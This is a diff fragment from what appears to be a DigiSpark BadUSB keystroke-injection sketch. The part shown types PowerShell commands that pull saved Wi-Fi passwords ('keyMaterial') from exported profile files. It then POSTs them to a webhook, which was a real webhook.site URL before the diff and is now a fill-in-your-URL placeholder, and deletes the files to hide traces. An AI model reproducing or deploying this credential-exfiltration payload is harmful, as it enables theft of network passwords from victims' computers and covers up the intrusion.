@@ -24,7 +24,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/25220c3c-746b-4d31-beda-b021911b1b56 -Method POST -InFile Wi-Fi-PASS"); //Insira a URI do seu webhook
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri <ADICIONE AQUI A URL DO SEU WEBHOOK> -Method POST -InFile Wi-Fi-PASS"); //Insira a URL do seu webhook
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
   DigiKeyboard.delay(100);
